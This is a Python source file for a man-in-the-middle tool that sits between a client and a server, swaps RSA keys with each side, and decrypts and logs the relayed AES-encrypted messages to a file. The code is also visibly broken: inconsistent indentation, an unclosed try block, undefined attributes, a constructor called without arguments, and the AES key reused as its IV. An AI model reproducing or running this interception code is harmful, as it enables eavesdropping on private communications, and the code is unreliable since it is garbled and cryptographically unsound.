import socket
import rsa
import random
from collections import deque
from threading import Thread, current_thread
from Crypto.Cipher import AES
import json
import os
from Crypto.Random import get_random_bytes
from base64 import b64encode
from time import time
import pickle


MSGLEN = 1024
IP = '0.0.0.5'
PORT = 5005


class Mitm:

	def __init__(self, ip, port, ip_cl, port_cl):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #send to real server
		self.sock.connect((ip, port))

		self.sock_cl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #listen real client
        self.sock_cl.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.sock_cl.bind(((ip_cl, port_cl)))
		self.sock_cl.listen()

		if os.path.isfile('rsa/rsa_priv'):
			with open('rsa/rsa_pub.pem', 'rb') as file:
				self.pub = rsa.PublicKey.load_pkcs1(file.read())
			with open('rsa/rsa_priv.pem', 'rb') as file:
				self.priv = rsa.PrivateKey.load_pkcs1(file.read())
		else:
			(self.pub, self.priv) = rsa.newkeys(1024)
			with open('rsa/rsa_pub.pem', 'wb') as file:
				file.write(self.pub.save_pkcs1('PEM'))
			with open('rsa/rsa_priv.pem', 'wb') as file:
				file.write(self.priv.save_pkcs1('PEM'))

		# send rsa publickey to server
		msg = self.pub.save_pkcs1('PEM').decode()
		sent = self.sock.sendall(msg.encode())
		if sent is not None:
			raise RuntimeError("socket connection broken")
			
		self.retrieve_session_key()

    def retrieve_session_key(self):
		key = rsa.decrypt(self.sock.recv(MSGLEN), self.priv)
		iv = key
		self.aes = AES.new(key, AES.MODE_CFB, iv)
		print('new key:', key)


	def send_aes(self):
		# send aes
		msg = rsa.encrypt(self.key, self.pub_cl)
		self.sock_cl.sendall(msg)


	def handle_client(self, client):
		# get public rsa
		try:
			pub = self.sock_cl.recv(1024).decode()
			self.cl_pub = rsa.key.PublicKey.load_pkcs1(pub, 'PEM')
		except:
			return

        self.send_aes()
        
		while True:
            try:
                data = self.sock_cl.recv(MSGLEN).strip(b'\r\n')
                with open("log_txt", "r+") as f:
				    msg = self.aes.decrypt(data).decode('latin-1')
                    f.write(msg)
                self.sock.sendall(data)
                data = self.sock.recv(MSGLEN).strip(b'\r\n')
                with open("log_txt", "r+") as f:
				    msg = self.aes.decrypt(data).decode('latin-1')
                    f.write(msg)
                self.sock_cl.sendall(data)
				
		return


if __name__ == '__main__':
	print("Starting mitm...")

	Mitm()


